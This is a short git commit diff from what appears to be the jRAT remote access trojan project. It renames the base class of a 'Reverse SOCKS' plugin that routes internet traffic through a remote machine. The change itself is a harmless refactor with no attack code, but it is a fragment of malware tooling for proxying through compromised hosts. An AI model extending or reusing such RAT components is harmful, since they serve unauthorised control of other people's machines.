6be46d64009e577102fb78b12a0bd7cbfc518416
redpois0n <red@cmail.nu>
2015-05-16 10:45:51 +0200

    RATPlugin > Plugin

--- Plugin Reverse Socks Client/src/se/jrat/plugin/socks/client/SocksPlugin.java
+++ Plugin Reverse Socks Client/src/se/jrat/plugin/socks/client/SocksPlugin.java
@@ -1,10 +1,10 @@
 package se.jrat.plugin.socks.client;
 
 import iconlib.IconUtils;
-import jrat.api.RATPlugin;
+import jrat.api.Plugin;
 import jrat.api.ui.RATMenuItem;
 
-public class SocksPlugin extends RATPlugin {
+public class SocksPlugin extends Plugin {
 	
 	public SocksPlugin() {
 		super("Reverse SOCKS", "1.0", "Connect to internet through remote machine", "jRAT");
